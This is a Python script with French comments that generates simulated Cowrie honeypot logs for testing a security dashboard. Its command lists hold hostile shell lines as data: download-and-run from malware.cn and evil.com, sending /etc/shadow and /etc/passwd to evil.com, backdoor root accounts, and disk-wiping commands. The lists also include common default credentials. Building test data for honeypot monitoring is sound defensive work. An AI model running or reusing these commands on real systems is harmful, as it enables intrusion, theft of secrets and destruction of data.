#!/usr/bin/env python3
"""
Générateur de logs Cowrie simulés pour les tests du dashboard.
"""

import json
import random
import uuid
from datetime import UTC, datetime, timedelta

# IPs d'attaquants simulées (publiques fictives mais réalistes)
ATTACKER_IPS = [
    "185.220.101.42",  # Tor exit (DE)
    "45.155.205.233",  # Russia
    "103.75.119.45",  # China
    "192.241.218.177",  # US scanner
    "31.42.186.101",  # Netherlands
    "89.248.167.131",  # Shodan
    "71.6.135.131",  # Censys
    "162.142.125.217",  # Censys
    "94.102.49.190",  # NL scanner
    "51.79.146.255",  # OVH (FR)
    "119.45.170.85",  # China
    "200.54.218.12",  # Brazil
    "14.63.170.91",  # South Korea
    "41.77.145.22",  # South Africa
]

# Noms de sensors
SENSORS = [
    "srv-compta-01",
    "srv-web-prod",
    "db-backup-01",
    "srv-mail-01",
    "srv-dev-test",
]

# Patterns de commandes par type d'attaquant
BOT_COMMANDS = [
    "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /",
    "wget http://malware.cn/bot.sh -O- | sh",
    "curl http://45.155.205.233/miner.sh | bash",
    "chmod 777 /tmp/x86",
    "/tmp/x86",
    "cat /proc/cpuinfo | grep name | wc -l",
    "ps aux | grep -v grep | grep -i 'kdevtmpfsi\\|kinsing\\|miner'",
    "crontab -l",
    "echo '*/5 * * * * curl http://evil.com/c.sh | sh' >> /tmp/cron",
    "rm -rf /var/log/*",
]

RECON_COMMANDS = [
    "ls -la",
    "pwd",
    "whoami",
    "id",
    "uname -a",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "ip addr",
    "netstat -tulpn",
    "ps aux",
    "cat /etc/os-release",
    "df -h",
    "free -m",
    "cat /proc/cpuinfo",
    "ls /home",
]

PERSIST_COMMANDS = [
    "echo 'ssh-rsa AAAA... attacker@evil' >> ~/.ssh/authorized_keys",
    "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor",
    "echo 'backdoor:password123' | chpasswd",
    "crontab -e",
    "echo '* * * * * /tmp/shell.sh' | crontab -",
    "systemctl enable evil.service",
]

LATERAL_COMMANDS = [
    "ssh root@192.168.1.10",
    "scp malware.sh root@192.168.1.20:/tmp/",
    "cat ~/.ssh/known_hosts",
    "cat /etc/hosts",
    "nmap -sP 192.168.1.0/24",
    "arp -a",
]

EXFIL_COMMANDS = [
    "tar czf /tmp/data.tar.gz /etc /home",
    "scp /tmp/data.tar.gz attacker@evil.com:/loot/",
    "curl -X POST -d @/etc/passwd http://evil.com/collect",
    "base64 /etc/shadow | nc evil.com 9999",
]

IMPACT_COMMANDS = [
    "rm -rf /*",
    "dd if=/dev/zero of=/dev/sda",
    "> /etc/passwd",
    "chmod 000 /",
    "iptables -F && iptables -P INPUT DROP",
]

# Credentials communes testées par les bots
CREDENTIALS = [
    ("root", "root"),
    ("root", "123456"),
    ("root", "admin"),
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "toor"),
    ("root", "password"),
    ("ubuntu", "ubuntu"),
    ("pi", "raspberry"),
    ("test", "test"),
    ("oracle", "oracle"),
    ("postgres", "postgres"),
    ("mysql", "mysql"),
    ("user", "user"),
    ("guest", "guest"),
]


def generate_session_id() -> str:
    """Génère un ID de session type Cowrie."""
    return uuid.uuid4().hex[:12]


def generate_events_for_session(
    src_ip: str,
    sensor: str,
    base_time: datetime,
    attack_type: str = "bot",
) -> list[dict]:
    """
    Génère une séquence d'événements Cowrie pour une session.
    """
    events = []
    session_id = generate_session_id()
    current_time = base_time
    src_port = random.randint(30000, 65000)
    dst_port = random.choice([22, 2222, 23])
    protocol = "ssh" if dst_port in [22, 2222] else "telnet"

    sensor_uuid = str(uuid.uuid4())

    def make_event(eventid: str, extra: dict = None) -> dict:
        nonlocal current_time
        e = {
            "eventid": eventid,
            "src_ip": src_ip,
            "src_port": src_port,
            "dst_ip": "172.17.0.2",
            "dst_port": dst_port,
            "session": session_id,
            "protocol": protocol,
            "sensor": sensor,
            "uuid": sensor_uuid,
            "timestamp": current_time.isoformat().replace("+00:00", "Z"),
        }
        if extra:
            e.update(extra)
        current_time += timedelta(seconds=random.uniform(0.5, 3.0))
        return e

    # 1. Connection
    events.append(
        make_event("cowrie.session.connect", {"message": f"New connection: {src_ip}:{src_port}"})
    )

    # 2. Login attempts
    num_attempts = random.randint(1, 5)
    success = random.random() > 0.3  # 70% success

    for i in range(num_attempts):
        username, password = random.choice(CREDENTIALS)
        is_last = i == num_attempts - 1

        if is_last and success:
            events.append(
                make_event(
                    "cowrie.login.success",
                    {
                        "username": username,
                        "password": password,
                        "message": f"login attempt [{username}/{password}] succeeded",
                    },
                )
            )
        else:
            events.append(
                make_event(
                    "cowrie.login.failed",
                    {
                        "username": username,
                        "password": password,
                        "message": f"login attempt [{username}/{password}] failed",
                    },
                )
            )

    # 3. Commands (only if login succeeded)
    if success:
        if attack_type == "bot":
            commands = random.sample(BOT_COMMANDS, min(len(BOT_COMMANDS), random.randint(3, 8)))
        elif attack_type == "human_recon":
            commands = random.sample(RECON_COMMANDS, random.randint(4, 10))
        elif attack_type == "advanced":
            commands = (
                random.sample(RECON_COMMANDS, 3)
                + random.sample(PERSIST_COMMANDS, 2)
                + random.sample(LATERAL_COMMANDS, 2)
                + random.sample(EXFIL_COMMANDS, 1)
            )
        elif attack_type == "destructive":
            commands = (
                random.sample(RECON_COMMANDS, 2)
                + random.sample(PERSIST_COMMANDS, 1)
                + random.sample(IMPACT_COMMANDS, 2)
            )
        else:
            commands = random.sample(RECON_COMMANDS, 3)

        for cmd in commands:
            current_time += timedelta(seconds=random.uniform(2, 10))
            events.append(
                make_event("cowrie.command.input", {"input": cmd, "message": f"CMD: {cmd}"})
            )

    # 4. Session close
    duration = (current_time - base_time).total_seconds()
    events.append(
        make_event(
            "cowrie.session.closed",
            {
                "duration": f"{duration:.1f}",
                "message": f"Connection lost after {duration:.1f} seconds",
            },
        )
    )

    return events


def generate_fake_logs(num_sessions: int = 50, hours_back: int = 24) -> list[dict]:
    """
    Génère un ensemble de sessions de test.
    """
    all_events = []

    # Distribution des types d'attaque
    attack_types = (
        ["bot"] * 20  # 40% bots
        + ["human_recon"] * 15  # 30% recon humain
        + ["advanced"] * 10  # 20% avancé
        + ["destructive"] * 5  # 10% destructif
    )

    base_time = datetime.now(UTC) - timedelta(hours=hours_back)

    for _ in range(num_sessions):
        src_ip = random.choice(ATTACKER_IPS)
        sensor = random.choice(SENSORS)
        attack_type = random.choice(attack_types)

        # Temps aléatoire dans la fenêtre
        offset_minutes = random.randint(0, hours_back * 60)
        session_time = base_time + timedelta(minutes=offset_minutes)

        events = generate_events_for_session(src_ip, sensor, session_time, attack_type)
        all_events.extend(events)

    # Trier par timestamp
    all_events.sort(key=lambda e: e["timestamp"])

    return all_events


def main():
    """Point d'entrée principal."""
    import sys

    num_sessions = int(sys.argv[1]) if len(sys.argv) > 1 else 50
    output_file = sys.argv[2] if len(sys.argv) > 2 else "data/cowrie.json"

    print(f"[fake-logs] Génération de {num_sessions} sessions...")
    events = generate_fake_logs(num_sessions=num_sessions)

    print(f"[fake-logs] {len(events)} événements générés")

    with open(output_file, "w", encoding="utf-8") as f:
        for event in events:
            f.write(json.dumps(event) + "\n")

    print(f"[fake-logs] Écrit dans {output_file}")


if __name__ == "__main__":
    main()
